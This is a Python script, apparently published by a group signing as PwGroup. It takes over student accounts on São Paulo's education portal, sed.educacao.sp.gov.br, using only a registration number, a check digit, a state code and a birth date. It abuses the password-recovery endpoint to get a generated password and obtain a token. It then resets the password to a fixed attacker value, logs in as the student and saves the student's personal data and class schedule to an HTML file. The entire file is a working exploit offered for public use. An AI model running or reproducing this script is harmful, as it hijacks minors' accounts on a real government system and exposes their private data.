#!/usr/bin/python
# -*- coding: utf-8 -*-

import os, sys, json, requests, argparse, datetime
import http.cookiejar

reload(sys)  
sys.setdefaultencoding('utf8')

##Verificar se o comando não é null
if len(sys.argv) < 4:
    print("python pesquisar.py <R.A> <Digito> <UF> <Data Nascimento> ")
    sys.exit(1)
##Codigo para formatar texto para UTF-8, se livrar do erro UnicodeDecodeError


##Capturar informacoes <R.A> <Digito> <UF> <Data Nascimento>
ra = sys.argv[1]
digito = sys.argv[2]
data_nascimento = sys.argv[4]
password = 'PWGroupHue'
UF = sys.argv[3]
user = ra+digito+UF.lower()
if os.path.exists(user+'.html'):
   os.unlink(user+'.html')
##Formatar data para o tipo Y-M-D
formatar_data = datetime.datetime.strptime(data_nascimento, '%d/%m/%Y')
data_nascimento = datetime.date.strftime(formatar_data, "%Y-%m-%d")
##Alterar o Login do Aluno para realizar o Login de
s2 = requests.Session()
senha_data = {"Numero":ra, "Digito":digito, "UF":UF, "DataNascimento":data_nascimento}
setar_senha = s2.post('https://sed.educacao.sp.gov.br/RecuperacaoSenha/AlterarLoginAluno', data=senha_data)
resposta = setar_senha.text
senha_gerada = json.loads(resposta)
codigo_retorno_senha = senha_gerada['Tipo']
##Msg para o codigo de retorno tipo 1 [ Aluno nao encontrado ]
##Sistema so aceita codigo de retorno tipo 0 [ Aluno encontrado ]
if codigo_retorno_senha == "Erro":
   print("Este dados de alunos não sao validos..")
   print("python pesquisar.py <R.A> <Digito> <UF> <Data Nascimento> ")
   sys.exit(1)
##Retornar o texto json, capturando as informações de Mensagem e retirando as informações inuteis para termos a nova senha
pegar_senha_gerada = senha_gerada['Msg']
pegar_senha_gerada = pegar_senha_gerada.replace("Seu login é: "+user+"  -  Sua senha é: ", "")
print('Gerar nova senha [ OK ]')
##Realizando um novo login, para capturar o Token para redifinir uma nova senha
s3 = requests.Session()
s3_data = {"usuario":user, "senha":pegar_senha_gerada}
s3_token = s3.post('https://sed.educacao.sp.gov.br/Logon/LogOn/', data=s3_data)
s3_resposta = s3_token.text
s3_resposta = json.loads(s3_resposta)
token = s3_resposta['Token']
print('Pegar Token [ OK ]')
##Redifinir Senha, verificando se esta marcado como Ativo
## pegar_senha_gerada = Senha Atual.. Data do Nascimento
# password = A nova senha que queremos, que no caso seria PWGroupHue
if s3_resposta['DefinirSenha'] is True:
   redifinir_data = {"token":token, "senhaAtual":pegar_senha_gerada, "senhaNova":password}
   redifinir_senha = s2.post('https://sed.educacao.sp.gov.br/Logon/AlterarSenha/', data=redifinir_data)
   print('Redifinir Senha [ OK ]')
##Realizando o Login para Capturar os Cookies
##Conectando na pagina  https://sed.educacao.sp.gov.br/Aluno/ConsultaAluno com os Cookies de Login Salvo
s = requests.Session()
s.cookies = http.cookiejar.LWPCookieJar(user)
print('Salvando cookie [ OK ]')
s.cookies.save()
data = {"usuario":user, "senha":password}
r = s.post('https://sed.educacao.sp.gov.br/Logon/LogOn/', data=data)
print('Carregando Cookie [ OK ]')
s.cookies.load(ignore_discard=True)
##Criar Arquivo de informações do Aluno
print('Gerando arquivo de dados [ OK ]')
bootstrap = '<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css" integrity="sha384-BVYiiSIFeK1dGmJRAkycuHAHRg32OmUcww7on3RYdg4Va+PmSTsz/K68vbdEjh4u" crossorigin="anonymous">'
##Limpando dados pessoais da pessoa
r = s.get('https://sed.educacao.sp.gov.br/Aluno/ConsultaAluno')
text = r.text
i = text.find('<div class="row">')
i2 = text[i:].find('</main>')
text1 = "<div id='texto'>"
text = text1+text[i+len('<div class="row">'):i+i2]
text =  "<head><title>Dados " + user +" </title><meta charset='UTF-8'></head>"+text.replace('Meus Dados','Dados do aluno').replace('tabela','table')
text = text.replace('disabled="disabled"', '')
##Limpando dados de horario da escola
p = s.get('https://sed.educacao.sp.gov.br/GradeAulaAluno/Index')
p_text = p.text
i = p_text.find('<div class="row">')
i2 = p_text[i:].find('</main>')
p_text1 = "<div id='texto'>"
p_text = p_text1+p_text[i+len('<div class="row">'):i+i2]
p_text =  "<head><title>Dados " + user +" </title><meta charset='UTF-8'></head>"+p_text.replace('Horário de Aula','Horario das Aula desse aluno').replace('tabela','table')
p_text = p_text.replace('disabled="disabled"', '')
p_text = p_text.replace('class="form"', 'class="form panel panel-default"')
p_text = p_text.replace('class="form-jagged"', 'style="display:none;"')
##Gerando arquivo...
arq = open(user+".html", "w")
arq.write(bootstrap+"<div class='container'>"+text+"</div><br><br><br><br><div class='container'>"+p_text+"</div>")
arq.close()
s.cookies.save(ignore_discard=True)
print('Arquivo de dados salvo [ OK ]')
print('Dados salvo no arquivo '+ user+'.html')
print('Para abir o arquivo no navegador voce pode usar:')
print('start (Pasta Salva)'+user+".html")
os.unlink(user)

##Code By PwGroup@4dr1anCF  [ 2/11/2017 - 23:00 ] ~~ Codigo Publico =)
##Update Code By JotinhaBR [ 16/05/2018 - 13:30 ] ~~ Codigo Publico =)
